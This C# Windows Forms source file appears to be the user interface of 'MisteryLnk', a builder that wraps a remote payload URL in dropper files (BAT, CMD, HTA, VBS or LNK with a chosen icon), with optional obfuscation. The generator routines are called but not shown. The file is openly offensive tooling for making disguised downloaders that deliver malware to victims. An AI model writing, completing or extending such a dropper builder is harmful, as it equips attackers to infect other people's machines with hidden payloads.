using MisteryLnk.Algorithms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MisteryLnk
{
    public partial class Form1 : Form
    {
        private static string IconFile;
        public Form1()
        {
            InitializeComponent();
        }
        #region FormMethods
        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            this.Capture = false;
            var msg = Message.Create(this.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref msg);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
      
        private void MinimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }
        #endregion

        #region Main Functions
        private void BuildBtn_Click(object sender, EventArgs e)
        {
            string[] MethodsMassive = { "BAT", "CMD", "HTA", "LNK", "VBS" };

            string
                url = UrlPayload_Box.Text,
                DropMethod = MethodDrop_Menu.Text;

            bool obfuscate = ObfuscateChk.Checked;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(DropMethod))
            {
                MessageBox.Show("Forms cannot be empty!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            if (MethodsMassive.Contains(DropMethod))
            {
                if (obfuscate && !(DropMethod == "BAT" || DropMethod == "CMD" || DropMethod == "VBS"))
                {
                    MessageBox.Show("Obfuscation is only available for CMD, BAT, VBS and HTA methods!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                switch (DropMethod)
                {
                    case "BAT":
                        Builder.BatBuilder(url, DropMethod, obfuscate);
                        break;
                    case "CMD":
                        Builder.CmdBuilder(url, DropMethod, obfuscate);
                        break;
                    case "HTA":
                        Builder.HtaBuilder(url, DropMethod);
                        break;
                    case "VBS":
                        Builder.VbsBuilder(url, DropMethod, obfuscate);
                        break;
                    case "LNK":
                        Builder.LnkBuilder(url, DropMethod, IconFile);
                        break;
                    default:
                        MessageBox.Show("Invalid method selected!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        break;
                }
            }
            else
            {
                MessageBox.Show("Selected method is not supported!", "Build information", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void IconSelectBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openIcon = new OpenFileDialog())
            {
                openIcon.Title = "Select ICON file.";
                openIcon.Filter = "ICO (*.ico)|*.ico";

                if (openIcon.ShowDialog() == DialogResult.OK)
                {
                    LnkIcon.Image = Image.FromFile(openIcon.FileName);
                    IconFile = openIcon.FileName;
                }
            }
        }

        private void LogotypeProgram_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }
        #endregion
    }
}
